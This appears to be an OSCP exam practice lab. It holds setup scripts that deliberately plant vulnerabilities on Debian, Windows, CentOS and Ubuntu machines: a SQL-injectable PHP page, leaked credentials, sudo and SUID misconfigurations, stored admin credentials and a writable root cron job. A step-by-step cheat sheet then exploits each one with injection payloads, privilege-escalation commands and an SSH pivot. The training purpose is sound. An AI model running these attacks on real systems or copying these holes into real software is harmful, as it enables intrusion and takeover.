# Lab: OSCP Exam Simulation 2 — With Step-by-Step Cheat Sheet

## Scoring

```
Debian  (standalone 1): 10 local + 10 proof = 20 pts
Windows (standalone 2): 10 local + 10 proof = 20 pts
AD Set  (CentOS→Ubuntu): 40 pts (all or nothing)
                                  Total: 80 pts | Pass: 56 pts (70%)
```

---

## Setup

### Standalone 1: Debian (192.168.244.132)

```bash
sudo apt update && sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server openssh-server -y
sudo systemctl enable --now apache2 ssh mariadb

echo "LOCAL{$(openssl rand -hex 16)}" | sudo tee /home/local.txt && sudo chmod 644 /home/local.txt
echo "PROOF{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

sudo mysql << 'SQL'
CREATE DATABASE cms;
CREATE TABLE cms.accounts(id INT AUTO_INCREMENT PRIMARY KEY,name VARCHAR(50),pass VARCHAR(100),note TEXT);
INSERT INTO cms.accounts VALUES(1,'admin','CmsAdm1n!','System administrator');
INSERT INTO cms.accounts VALUES(2,'backup','B@ckup2026','SSH access: backup / B@ckup2026');
GRANT ALL ON cms.* TO 'cmsuser'@'localhost' IDENTIFIED BY 'cmsdbp@ss';
FLUSH PRIVILEGES;
SQL

sudo mkdir -p /var/www/html/cms
cat << 'PHPEOF' | sudo tee /var/www/html/cms/index.php
<?php
$conn=new mysqli("localhost","cmsuser","cmsdbp@ss","cms");$msg="";
if(isset($_GET['search'])){$s=$_GET['search'];
$r=$conn->query("SELECT id,name,note FROM accounts WHERE name LIKE '%$s%'");
if($r&&$r->num_rows>0){$msg="<table border=1><tr><th>ID</th><th>Name</th><th>Note</th></tr>";
while($row=$r->fetch_assoc())$msg.="<tr><td>{$row['id']}</td><td>{$row['name']}</td><td>{$row['note']}</td></tr>";
$msg.="</table>";}else{$msg="<p>No results.</p>";if($conn->error)$msg.="<p style='color:red'>{$conn->error}</p>";}}
?>
<html><body><h1>Staff Directory</h1>
<form method="GET">Search: <input name="search" size="30"> <button>Search</button></form>
<?php echo $msg; ?></body></html>
PHPEOF

echo "<html><body><h1>Company Site</h1><p>Under construction.</p><!-- CMS at /cms/ --></body></html>" | sudo tee /var/www/html/index.html

sudo useradd -m -s /bin/bash backup && echo "backup:B@ckup2026" | sudo chpasswd
echo "backup ALL=(root) NOPASSWD: /usr/bin/find" | sudo tee /etc/sudoers.d/backup

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

### Standalone 2: Windows 11

```powershell
# Run as Administrator
-join((48..57)+(65..90)+(97..122)|Get-Random -Count 32|%{[char]$_}) | Out-File C:\Users\Public\local.txt
-join((48..57)+(65..90)+(97..122)|Get-Random -Count 32|%{[char]$_}) | Out-File C:\Users\Administrator\Desktop\proof.txt

net user support Supp0rt! /add

mkdir C:\WebApp
@"
from http.server import HTTPServer,SimpleHTTPRequestHandler
HTTPServer(('0.0.0.0',8080),SimpleHTTPRequestHandler).serve_forever()
"@ | Out-File C:\WebApp\server.py

@"
<h1>Support Portal</h1>
<p><a href='ticket.html'>Submit a Ticket</a></p>
<!-- Admin note: default creds are support / Supp0rt! for RDP -->
"@ | Out-File C:\WebApp\index.html

"<h1>Ticket System</h1><p>Ticket system under maintenance.</p>" | Out-File C:\WebApp\ticket.html
"IT Admin Notes: WiFi=Corp2026! VPN=vpnadmin/VpnStr0ng!" | Out-File C:\WebApp\notes.txt

Start-Process python -ArgumentList "C:\WebApp\server.py" -WindowStyle Hidden

# Privesc vector: unquoted service path
mkdir "C:\Program Files\Support App\Help Service"
copy C:\Windows\System32\cmd.exe "C:\Program Files\Support App\Help Service\svc.exe"
sc.exe create SupportSvc binPath= "C:\Program Files\Support App\Help Service\svc.exe" start= auto
icacls "C:\Program Files\Support App" /grant Everyone:(OI)(CI)F

# Privesc vector 2: stored credentials
cmdkey /add:fileserver /user:Administrator /pass:Adm1n2026!

Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### AD Set: CentOS (192.168.244.131 / 172.16.0.1)

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo dnf install httpd php -y
sudo systemctl enable --now httpd sshd

sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null && sudo ip link set ens224 up

echo "PROOF_AD1{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

# Web app with hidden page
echo "<h1>Internal Tools</h1><p>Welcome to the internal dashboard.</p>" | sudo tee /var/www/html/index.html
sudo mkdir /var/www/html/internal
echo "<h1>Jump Server Access</h1><p>SSH to this server: sysop / Sys0p@2026!</p><p>From here you can reach the deployment server at 172.16.0.2</p>" | sudo tee /var/www/html/internal/access.html

sudo useradd -m -s /bin/bash sysop && echo "sysop:Sys0p@2026!" | sudo chpasswd

# Breadcrumb to Ubuntu
echo "deploy_host=172.16.0.2" | sudo tee /home/sysop/deploy.conf
echo "deploy_user=deployer" | sudo tee -a /home/sysop/deploy.conf
echo "deploy_pass=D3pl0y3r!" | sudo tee -a /home/sysop/deploy.conf
sudo chown sysop:sysop /home/sysop/deploy.conf

# Privesc: SUID on bash copy
sudo cp /usr/bin/bash /usr/local/bin/maintenance
sudo chmod u+s /usr/local/bin/maintenance

# Networking for pivot
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT ACCEPT
sudo iptables -A FORWARD -s 192.168.244.0/24 -d 172.16.0.0/24 -j ACCEPT
sudo iptables -A FORWARD -s 172.16.0.0/24 -d 192.168.244.0/24 -j ACCEPT
sudo iptables -P FORWARD DROP
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE
```

### AD Set: Ubuntu (172.16.0.2)

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null && sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server -y && sudo systemctl enable --now ssh

echo "PROOF_AD2{$(openssl rand -hex 16)}" | sudo tee /root/proof.txt && sudo chmod 600 /root/proof.txt

sudo useradd -m -s /bin/bash deployer && echo "deployer:D3pl0y3r!" | sudo chpasswd

# Privesc: writable script run by cron as root
sudo mkdir -p /opt/deploy
echo '#!/bin/bash' | sudo tee /opt/deploy/health.sh
echo 'echo "health ok" >> /tmp/deploy_health.log' | sudo tee -a /opt/deploy/health.sh
sudo chmod 777 /opt/deploy/health.sh
echo "*/2 * * * * root /opt/deploy/health.sh" | sudo tee /etc/cron.d/deploy_health

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP && sudo iptables -P OUTPUT ACCEPT
```

---

## CHEAT SHEET — Exactly what to do and why

### Phase 1: Launch all scans (0:00 — 0:15)

**WHY:** You scan everything first because nmap takes time. While scans run, you review results as they come in.

```bash
# Quick scans on all targets
nmap -sV -sC -oA debian 192.168.244.132 &
nmap -sV -sC -oA centos 192.168.244.131 &
nmap -sV -sC -p- --min-rate=1000 -oA debian_full 192.168.244.132 &

# Discover Windows IP if unknown
nmap -sn 192.168.244.0/24
# Then scan it
nmap -sV -sC -p- --min-rate=1000 -oA windows WINDOWS_IP &
```

### Phase 2: Debian — Standalone 1 (0:15 — 2:00)

**Step 1: Read nmap results**

```bash
cat debian.nmap
# Shows: 22/tcp SSH, 80/tcp HTTP Apache
```

**WHY THIS MATTERS:** HTTP means web enumeration. SSH means we can log in once we find credentials.

**Step 2: Check the web server**

```bash
curl -s http://192.168.244.132 | grep "<!--"
# HTML comment reveals: /cms/
```

**WHY:** HTML comments are developer notes left in source code. They often reveal hidden paths. Always check page source.

**Step 3: Run gobuster**

```bash
gobuster dir -u http://192.168.244.132 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
gobuster dir -u http://192.168.244.132/cms -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**Step 4: Test the CMS search for SQLi**

```bash
curl "http://192.168.244.132/cms/?search=admin"     # normal — shows admin user
curl "http://192.168.244.132/cms/?search=admin'"     # error — SQLi confirmed!
```

**WHY THE SINGLE QUOTE WORKS:** It breaks the SQL string delimiter, causing a syntax error. If the application shows a SQL error, the input goes directly into the query without sanitization.

**Step 5: Extract credentials with UNION injection**

```bash
# Find column count
curl "http://192.168.244.132/cms/?search=' ORDER BY 3-- -"    # works (3 columns)

# Extract all data
curl "http://192.168.244.132/cms/?search=' UNION SELECT 1,GROUP_CONCAT(name,':',pass),note FROM accounts-- -"
# Result includes: backup:B@ckup2026 and note "SSH access: backup / B@ckup2026"
```

**WHY UNION WORKS:** UNION appends a second query's results to the first. You match the column count (3), then put your extraction in column 2 (the displayed one).

**Step 6: SSH with found credentials → local.txt**

```bash
ssh backup@192.168.244.132    # Password: B@ckup2026
cat /home/local.txt            # CAPTURE LOCAL.TXT
cat /home/local.txt && whoami && ip a    # SCREENSHOT THIS
```

**Step 7: Privilege escalation**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/find

sudo find / -exec /bin/bash \; -quit
whoami    # root
cat /root/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

**WHY THIS WORKS:** `find` is allowed to run as root via sudo. The `-exec` flag runs a command for each file found. `/bin/bash` spawns a shell. `-quit` stops after the first file (so you get one shell, not thousands). Since find runs as root, bash runs as root.

**Score: 20/80**

### Phase 3: Windows — Standalone 2 (2:00 — 4:00)

**Step 1: Scan revealed a web server on 8080**

```bash
cat windows.nmap
# Shows: 3389/tcp RDP, 8080/tcp HTTP, 445/tcp SMB
```

**Step 2: Enumerate the web server**

```bash
curl http://WINDOWS_IP:8080/
# Shows: Support Portal with link to ticket.html
curl -s http://WINDOWS_IP:8080/ | grep "<!--"
# Comment reveals: default creds support / Supp0rt! for RDP

gobuster dir -u http://WINDOWS_IP:8080 -w /usr/share/wordlists/dirb/common.txt -x txt,html,bak
# Finds: notes.txt
curl http://WINDOWS_IP:8080/notes.txt
# VPN and WiFi credentials
```

**WHY GOBUSTER WITH -x txt:** The web server is Python's SimpleHTTPRequestHandler — it serves static files. No PHP. So we look for .txt, .html, .bak files.

**Step 3: RDP with found credentials → local.txt**

```bash
xfreerdp /v:WINDOWS_IP /u:support /p:'Supp0rt!' /cert-ignore
# Or
rdesktop WINDOWS_IP -u support -p 'Supp0rt!'
```

In the RDP session:
```cmd
type C:\Users\Public\local.txt
type C:\Users\Public\local.txt & whoami & ipconfig    :: SCREENSHOT THIS
```

**Step 4: Privilege escalation — check for vectors**

```cmd
:: Check unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """"
:: Found: SupportSvc with unquoted path and writable directory

:: Check stored credentials
cmdkey /list
:: Found: Administrator credentials stored for fileserver

:: Use stored credentials (easier path)
runas /savecred /user:Administrator cmd.exe
:: Admin shell opens — no password prompt needed!

type C:\Users\Administrator\Desktop\proof.txt & whoami & ipconfig    :: SCREENSHOT THIS
```

**WHY STORED CREDENTIALS WORK:** `cmdkey /list` shows credentials saved in Windows Credential Manager. `runas /savecred` uses those stored credentials without prompting for a password. If an admin saved their password, any user on the machine can use it.

**Score: 40/80**

### Phase 4: AD Set — CentOS (4:00 — 6:00)

**Step 1: Enumerate CentOS web server**

```bash
curl http://192.168.244.131/
# Internal Tools page — nothing obvious

gobuster dir -u http://192.168.244.131 -w /usr/share/wordlists/dirb/common.txt -x html,php,txt
# Finds: /internal/access.html

curl http://192.168.244.131/internal/access.html
# Reveals: SSH credentials sysop / Sys0p@2026! and mention of 172.16.0.2
```

**WHY GOBUSTER FOUND THIS:** The `/internal/` directory wasn't linked from the main page. Without directory brute forcing, you'd never know it exists. This is why gobuster runs on EVERY web server.

**Step 2: SSH to CentOS**

```bash
ssh sysop@192.168.244.131    # Password: Sys0p@2026!
```

**Step 3: Enumerate for credentials and privesc**

```bash
cat /home/sysop/deploy.conf
# deploy_host=172.16.0.2, deploy_user=deployer, deploy_pass=D3pl0y3r!

find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/maintenance — SUID!

/usr/local/bin/maintenance -p
whoami    # root
cat /root/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

**WHY `-p` FLAG:** The SUID binary is a copy of bash. Bash normally drops privileges when run with SUID. The `-p` flag means "preserve privileges" — don't drop the SUID. Without `-p`, you'd get a shell as sysop, not root.

### Phase 5: AD Set — Pivot to Ubuntu (6:00 — 7:30)

**Step 4: Set up SSH tunnel to reach 172.16.0.2**

```bash
# From Kali — dynamic SOCKS proxy through CentOS
ssh -D 9050 sysop@192.168.244.131

# Or SSH directly from CentOS to Ubuntu
ssh deployer@172.16.0.2    # Password: D3pl0y3r!
```

**WHY SSH TUNNEL:** Ubuntu (172.16.0.2) is on the internal 172.16.0.0/24 network. Kali can't reach it directly. CentOS has interfaces on both networks, so it acts as a bridge. The SSH tunnel routes your traffic through CentOS.

**Step 5: Escalate on Ubuntu**

```bash
# On Ubuntu as deployer
cat /etc/cron.d/deploy_health
# */2 * * * * root /opt/deploy/health.sh

ls -la /opt/deploy/health.sh
# -rwxrwxrwx — world writable!

# Inject a command into the cron script
echo 'cp /root/proof.txt /tmp/proof.txt && chmod 644 /tmp/proof.txt' >> /opt/deploy/health.sh

# Wait 2 minutes
cat /tmp/proof.txt && whoami && ip a    # SCREENSHOT THIS
```

**WHY THIS WORKS:** The cron job runs `/opt/deploy/health.sh` as root every 2 minutes. The script is writable by everyone (777 permissions). Anything you add to the script runs as root on the next cron execution.

**Score: 80/80 — PASS**

---

## Cleanup

```bash
# Debian
sudo mysql -e "DROP DATABASE cms;" && sudo userdel -r backup
sudo rm -rf /var/www/html/cms /etc/sudoers.d/backup /home/local.txt /root/proof.txt

# Windows: reverse all setup steps from PowerShell as admin

# CentOS
sudo userdel -r sysop && sudo rm /usr/local/bin/maintenance /root/proof.txt
sudo iptables -F && sudo iptables -t nat -F && sudo iptables -P INPUT ACCEPT && sudo iptables -P FORWARD ACCEPT

# Ubuntu
sudo userdel -r deployer && sudo rm /opt/deploy/health.sh /etc/cron.d/deploy_health /root/proof.txt
sudo iptables -F && sudo iptables -P INPUT ACCEPT
```
